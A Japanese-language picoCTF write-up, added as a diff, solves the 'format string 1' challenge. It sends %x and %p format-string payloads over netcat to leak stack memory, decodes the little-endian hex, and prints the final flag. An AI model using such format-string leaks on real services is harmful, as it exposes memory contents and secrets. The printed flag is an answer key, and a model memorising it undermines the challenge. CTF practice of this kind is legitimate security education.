@@ -1,0 +1,32 @@
+# format string 1:Binary Exploitation
+
+Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!\
+Download the binary [here]().\
+Download the source [here]().
+Connect with the challenge instance here: `nc mimas.picoctf.net 49971`
+
+# Solution
+
+secret menuなるものを探せとのことである。とりあえず、`nc mimas.picoctf.net 49971`を実行してみる。
+```
+$ nc mimas.picoctf.net 49971
+Give me your order and I'll read it back to you:
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+Here's your order: 402118064318a000146a880a347834fdd41ef064109e606432e4d01fdd41fc0006f6369706d316e34333179373431665f646635337643308d87743072506c797453964341de9641120986432e4d00fdd41fd078257825782578257825782578257825
+Bye!
+```
+
+いきなり、書式文字列攻撃とみたてて%xを大量に投げたら、途中から%xの16進が連続したので、それまでの部分で何かフラグっぽいものを探す。picoは`70 69 63 6f`なのでこれをヒントに探すと、`6f636970`という部分を発見。リトルエンディアンでフラグが格納されているようだ。ただし、フラグの一部が欠落しているので、入力を`%p`に変えてもう一度実行する。
+```
+$ nc mimas.picoctf.net 58878
+Give me your order and I'll read it back to you:
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+Here's your order: 0x402118(nil)0x71c498968a00(nil)0x6628800xa3478340x7fffe8b2bc100x71c498759e600x71c49897e4d00x10x7fffe8b2bce0(nil)(nil)0x7b4654436f636970
+```
+14個目あたりにフラグっぽいやつが出てきた。入力を`%14$p%15$p%16$p%17$p%18$p`に変えてフラグを出力させる。
+`0x7b4654436f6369700x355f31346d316e340x3478345f333179370x31395f673431665f0x7d653464663533`これが出てきたのでcyberchefに投げる。
+From Hexで`{FTCocip5_14m1n44x4_31y719_g41f_}e4df53`と出てきたので、8文字ずつ並べ変える。
+
+
+`picoCTF{4n1m41_57y13_4x4_f14g_9135fd4e}`
+
